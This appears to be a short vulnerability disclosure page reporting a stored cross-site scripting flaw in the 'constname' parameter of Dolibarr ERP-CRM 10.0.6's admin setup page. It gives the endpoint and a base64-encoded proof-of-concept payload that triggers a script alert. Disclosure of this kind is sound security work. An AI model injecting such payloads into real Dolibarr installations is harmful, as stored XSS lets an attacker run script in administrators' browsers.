---
title: 0day's
layout: page
permalink: /0days
---

# Dolibarr - Stored XSS [constname parameter]
# Version : 10.0.6
# Date: 17.01.2020
# Vendor : [https://www.dolibarr.org/](https://www.dolibarr.org/)
# CVE : N/A

Description: In this version of the Dolibarr ERP - CRM program is allows Stored XSS by placing a payload in the "constname" parameter field in other setup page.

# Url : http://192.168.1.133/htdocs/admin/const.php
# Payload : \<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+>\</object>
